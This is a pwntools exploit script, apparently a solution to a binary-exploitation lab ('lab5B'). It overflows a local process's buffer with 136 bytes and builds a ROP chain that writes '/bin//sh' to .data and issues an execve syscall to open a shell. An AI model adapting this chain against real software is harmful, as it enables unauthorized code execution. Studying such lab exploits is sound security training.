from pwn import *
rop=process("./lab5B")
ui.pause()


p=b'A'*136
p += p64(0x00000000004078ce) # pop rsi ; ret
p += p64(0x00000000004ab0e0) # @ .data
p += p64(0x0000000000411e2c) # pop rax ; ret
p += b'/bin//sh'
p += p64(0x0000000000440591) # mov qword ptr [rsi], rax ; ret
p += p64(0x00000000004078ce) # pop rsi ; ret
p += p64(0x00000000004ab0e8) # @ .data + 8
p += p64(0x00000000004394d0) # xor rax, rax ; ret
p += p64(0x0000000000440591) # mov qword ptr [rsi], rax ; ret
p += p64(0x00000000004017e6) # pop rdi ; ret
p += p64(0x00000000004ab0e0) # @ .data
p += p64(0x00000000004078ce) # pop rsi ; ret
p += p64(0x00000000004ab0e8) # @ .data + 8
p += p64(0x00000000004016fb) # pop rdx ; ret
p += p64(0x00000000004ab0e8) # @ .data + 8
p += p64(0x00000000004394d0) # xor rax, rax ; ret
p +=p64(0x00000000004613b0) *59



p+=p64(0x000000000040120b) #syscall

rop.sendline(p)
rop.interactive()
